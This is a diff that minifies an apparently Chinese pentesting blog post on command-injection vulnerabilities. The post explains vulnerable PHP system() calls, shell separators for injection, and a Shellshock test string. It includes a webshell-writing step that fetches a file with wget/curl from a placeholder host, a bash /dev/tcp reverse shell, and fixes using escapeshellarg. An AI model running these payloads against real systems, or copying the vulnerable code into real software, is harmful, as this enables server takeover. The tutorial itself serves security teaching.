@@ -1,246 +1,86 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content=""/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>命令执行漏洞 | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>命令执行漏洞</h1>
-      
-<div class="post-meta">
-    <time>2016-07-24</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/rce">rce</a>)
-</div>
-
-      <div><h3 id="0x00-命令执行">0x00 命令执行</h3>
-<pre tabindex="0"><code>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=author content="Reber"><title>命令执行漏洞 | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>命令执行漏洞</h1><div class=post-meta><time>2016-07-24</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/rce>rce</a>)</div><div><h3 id=0x00-命令执行>0x00 命令执行</h3><pre tabindex=0><code>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、
 passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令
 拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。
-</code></pre><h3 id="0x01-利用条件">0x01 利用条件</h3>
-<ol>
-<li>应用调用执行系统命令的函数</li>
-<li>将用户输入作为系统命令的参数拼接到了命令行中</li>
-<li>没有对用户输入进行过滤或过滤不严</li>
-</ol>
-<h3 id="0x02-漏洞分类">0x02 漏洞分类</h3>
-<ol>
-<li>代码层过滤不严<br>
-商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：<br>
-system(&quot;/bin/program --arg $arg&quot;);</li>
-<li>系统的漏洞造成命令执行<br>
-bash破壳漏洞(CVE-2014-6271)<br>
-执行<code>env x='() { :;}; echo vulnerable' bash -c &quot;echo this is a test&quot;</code>后<br>
-若输出vulnerable则证明存在漏洞</li>
-<li>调用的第三方组件存在代码执行漏洞<br>
-如WordPress中用来处理图片的ImageMagick组件<br>
-JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等)<br>
-ThinkPHP命令执行</li>
-</ol>
-<h3 id="0x03-漏洞危害">0x03 漏洞危害</h3>
-<ol>
-<li>继承Web服务程序的权限去执行系统命令或读写文件</li>
-<li>反弹shell</li>
-<li>控制整个网站甚至控制服务器</li>
-<li>进一步内网渗透</li>
-<li>等等</li>
-</ol>
-<h3 id="0x04-漏洞挖掘">0x04 漏洞挖掘</h3>
-<p>可以google hacking<br>
-尝试：filetype:action或filetype:do来找struts2</p>
-<h3 id="0x05-漏洞可能代码以system为例">0x05 漏洞可能代码(以system为例)</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$arg</span><span style="color:#e6db74">&#34;</span>);  <span style="color:#75715e">//直接输入即可
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">2.</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/prog </span><span style="color:#e6db74">$arg</span><span style="color:#e6db74">&#34;</span>);  <span style="color:#75715e">//直接输入;ls
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">3.</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/prog -p </span><span style="color:#e6db74">$arg</span><span style="color:#e6db74">&#34;</span>);  <span style="color:#75715e">//和2一样
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">4.</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/prog --p=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">$arg\</span><span style="color:#e6db74">&#34;&#34;);  //可以输入&#34;</span>;<span style="color:#a6e22e">ls</span>;<span style="color:#e6db74">&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">5. system(&#34;</span><span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">prog</span> <span style="color:#f92672">--</span><span style="color:#a6e22e">p</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$arg&#39;</span><span style="color:#e6db74">&#34;);  //可以输入&#39;;ls;&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">在Linux上，上面的;也可以用|、||、&amp;、&amp;&amp;代替
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ;前面的执行完执行后面的(ping -c 1 10.11.11.11;whoami)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    |是管道符，显示后面的执行结果(ping -c 1 10.11.11.11|whoami)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ||当前面的执行出错时执行后面的(ping -c 1 a.a.a||whoami)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &amp;会把前面的放在后台执行，然后执行后面的(ping -c 1 10.11.11.11&amp;whoami)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &amp;&amp;前面的语句为假则直接出错，后面的也不执行(ping -c 1 10.11.11.11&amp;&amp;whoami)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">在Windows上，不能用;可以用|、||、&amp;、&amp;&amp;代替
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    |直接执行后面的语句(ping -n 1 10.11.11.11|whoami)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ||前面出错才执行后面的(ping -n 1 a.a.a||whoami)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &amp;前面执行完执行后面的(ping -n 1 10.11.11.11&amp;whoami)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &amp;&amp;前面的语句为假则直接出错，后面的也不执行(ping -n 1 10.11.11.11&amp;&amp;whoami)
-</span></span></span></code></pre></div><h3 id="0x06-漏洞利用">0x06 漏洞利用</h3>
-<ul>
-<li>示例一</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>    $arg <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>];
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($arg) {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$arg</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><p><img src="/img/post/command_execution1.png" alt="命令执行示例1"></p>
-<ul>
-<li>示例二</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>    $arg <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>];
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($arg) {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;ping -c 3 </span><span style="color:#e6db74">$arg</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><p><img src="/img/post/command_execution2.png" alt="命令执行示例2"></p>
-<ul>
-<li>示例三</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>    $arg <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>];
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($arg) {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;ls -al </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">$arg\</span><span style="color:#e6db74">&#34;&#34;);
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    }
-</span></span></span></code></pre></div><p><img src="/img/post/command_execution3.png" alt="命令执行示例3">
-注：若引号被转义，则可以用<b>`id`</b>来执行</p>
-<ul>
-<li>示例四</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>    $arg <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>];
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($arg) {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;ls -al &#39;</span><span style="color:#e6db74">$arg</span><span style="color:#e6db74">&#39;&#34;</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><p><img src="/img/post/command_execution4.png" alt="命令执行示例4"></p>
-<h3 id="0x07-其他">0x07 其他</h3>
-<ul>
-<li>动态函数调用<br>
-在cmd.php中的代码如下：</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>    $fun <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;fun&#39;</span>];
-</span></span><span style="display:flex;"><span>    $par <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;par&#39;</span>];
-</span></span><span style="display:flex;"><span>    $fun($par);
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">//提交http://localhost/cmd.php?fun=system&amp;par=net user，最终执行的是system(&#34;net user&#34;)
-</span></span></span></code></pre></div><h3 id="0x08-关于获取webshell">0x08 关于获取webshell</h3>
-<p><strong>要有写权限！</strong></p>
-<pre tabindex="0"><code>1.得到当前或绝对路径(可以用pwd)
+</code></pre><h3 id=0x01-利用条件>0x01 利用条件</h3><ol><li>应用调用执行系统命令的函数</li><li>将用户输入作为系统命令的参数拼接到了命令行中</li><li>没有对用户输入进行过滤或过滤不严</li></ol><h3 id=0x02-漏洞分类>0x02 漏洞分类</h3><ol><li>代码层过滤不严<br>商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：<br>system("/bin/program --arg $arg");</li><li>系统的漏洞造成命令执行<br>bash破壳漏洞(CVE-2014-6271)<br>执行<code>env x='() { :;}; echo vulnerable' bash -c "echo this is a test"</code>后<br>若输出vulnerable则证明存在漏洞</li><li>调用的第三方组件存在代码执行漏洞<br>如WordPress中用来处理图片的ImageMagick组件<br>JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等)<br>ThinkPHP命令执行</li></ol><h3 id=0x03-漏洞危害>0x03 漏洞危害</h3><ol><li>继承Web服务程序的权限去执行系统命令或读写文件</li><li>反弹shell</li><li>控制整个网站甚至控制服务器</li><li>进一步内网渗透</li><li>等等</li></ol><h3 id=0x04-漏洞挖掘>0x04 漏洞挖掘</h3><p>可以google hacking<br>尝试：filetype:action或filetype:do来找struts2</p><h3 id=0x05-漏洞可能代码以system为例>0x05 漏洞可能代码(以system为例)</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ae81ff>1.</span> <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>$arg</span><span style=color:#e6db74>&#34;</span>);  <span style=color:#75715e>//直接输入即可
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#ae81ff>2.</span> <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;/bin/prog </span><span style=color:#e6db74>$arg</span><span style=color:#e6db74>&#34;</span>);  <span style=color:#75715e>//直接输入;ls
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#ae81ff>3.</span> <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;/bin/prog -p </span><span style=color:#e6db74>$arg</span><span style=color:#e6db74>&#34;</span>);  <span style=color:#75715e>//和2一样
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#ae81ff>4.</span> <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;/bin/prog --p=</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>$arg\</span><span style=color:#e6db74>&#34;&#34;);  //可以输入&#34;</span>;<span style=color:#a6e22e>ls</span>;<span style=color:#e6db74>&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>5. system(&#34;</span><span style=color:#f92672>/</span><span style=color:#a6e22e>bin</span><span style=color:#f92672>/</span><span style=color:#a6e22e>prog</span> <span style=color:#f92672>--</span><span style=color:#a6e22e>p</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;$arg&#39;</span><span style=color:#e6db74>&#34;);  //可以输入&#39;;ls;&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>在Linux上，上面的;也可以用|、||、&amp;、&amp;&amp;代替
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    ;前面的执行完执行后面的(ping -c 1 10.11.11.11;whoami)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    |是管道符，显示后面的执行结果(ping -c 1 10.11.11.11|whoami)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    ||当前面的执行出错时执行后面的(ping -c 1 a.a.a||whoami)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &amp;会把前面的放在后台执行，然后执行后面的(ping -c 1 10.11.11.11&amp;whoami)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &amp;&amp;前面的语句为假则直接出错，后面的也不执行(ping -c 1 10.11.11.11&amp;&amp;whoami)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>在Windows上，不能用;可以用|、||、&amp;、&amp;&amp;代替
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    |直接执行后面的语句(ping -n 1 10.11.11.11|whoami)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    ||前面出错才执行后面的(ping -n 1 a.a.a||whoami)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &amp;前面执行完执行后面的(ping -n 1 10.11.11.11&amp;whoami)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &amp;&amp;前面的语句为假则直接出错，后面的也不执行(ping -n 1 10.11.11.11&amp;&amp;whoami)
+</span></span></span></code></pre></div><h3 id=0x06-漏洞利用>0x06 漏洞利用</h3><ul><li>示例一</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>    $arg <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;cmd&#39;</span>];
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ($arg) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>$arg</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span></code></pre></div><p><img src=/img/post/command_execution1.png alt=命令执行示例1></p><ul><li>示例二</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>    $arg <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;cmd&#39;</span>];
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ($arg) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;ping -c 3 </span><span style=color:#e6db74>$arg</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p><img src=/img/post/command_execution2.png alt=命令执行示例2></p><ul><li>示例三</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>    $arg <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;cmd&#39;</span>];
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ($arg) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;ls -al </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>$arg\</span><span style=color:#e6db74>&#34;&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    }
+</span></span></span></code></pre></div><p><img src=/img/post/command_execution3.png alt=命令执行示例3>
+注：若引号被转义，则可以用<b>`id`</b>来执行</p><ul><li>示例四</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>    $arg <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;cmd&#39;</span>];
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ($arg) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;ls -al &#39;</span><span style=color:#e6db74>$arg</span><span style=color:#e6db74>&#39;&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p><img src=/img/post/command_execution4.png alt=命令执行示例4></p><h3 id=0x07-其他>0x07 其他</h3><ul><li>动态函数调用<br>在cmd.php中的代码如下：</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>    $fun <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;fun&#39;</span>];
+</span></span><span style=display:flex><span>    $par <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;par&#39;</span>];
+</span></span><span style=display:flex><span>    $fun($par);
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>//提交http://localhost/cmd.php?fun=system&amp;par=net user，最终执行的是system(&#34;net user&#34;)
+</span></span></span></code></pre></div><h3 id=0x08-关于获取webshell>0x08 关于获取webshell</h3><p><strong>要有写权限！</strong></p><pre tabindex=0><code>1.得到当前或绝对路径(可以用pwd)
 2.写文件:
     用?cmd=echo &#34;&lt;?php phpinfo()?&gt;&#34; &gt; /var/www/html/info.php
     或?cmd=wget -O /var/www/html/info.php http://www.xx.com/phpinfo.txt
     或?cmd=curl http://www.xx.com/phpinfo.txt &gt; /var/www/html/info.php
-</code></pre><h3 id="0x09-反弹shell">0x09 反弹shell</h3>
-<pre tabindex="0"><code>远程执行nc -vlp 8888
+</code></pre><h3 id=0x09-反弹shell>0x09 反弹shell</h3><pre tabindex=0><code>远程执行nc -vlp 8888
 ?cmd=bash -i &gt;&amp; /dev/tcp/10.0.0.1/8888 0&gt;&amp;1
-</code></pre><h3 id="0x0a-漏洞修复">0x0A 漏洞修复</h3>
-<ol>
-<li>尽量少用执行命令的函数或者直接禁用</li>
-<li>参数值尽量使用引号包括</li>
-<li>在使用动态函数之前，确保使用的函数是指定的函数之一</li>
-<li>在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义</li>
-</ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>    $arg <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>];
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// $arg = addslashes($arg);
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $arg <span style="color:#f92672">=</span> <span style="color:#a6e22e">escapeshellarg</span>($arg);  <span style="color:#75715e">//拼接前就处理
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> ($arg) {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;ls -al &#39;</span><span style="color:#e6db74">$arg</span><span style="color:#e6db74">&#39;&#34;</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div></div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+</code></pre><h3 id=0x0a-漏洞修复>0x0A 漏洞修复</h3><ol><li>尽量少用执行命令的函数或者直接禁用</li><li>参数值尽量使用引号包括</li><li>在使用动态函数之前，确保使用的函数是指定的函数之一</li><li>在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>    $arg <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;cmd&#39;</span>];
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// $arg = addslashes($arg);
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $arg <span style=color:#f92672>=</span> <span style=color:#a6e22e>escapeshellarg</span>($arg);  <span style=color:#75715e>//拼接前就处理
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> ($arg) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;ls -al &#39;</span><span style=color:#e6db74>$arg</span><span style=color:#e6db74>&#39;&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span></code></pre></div></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
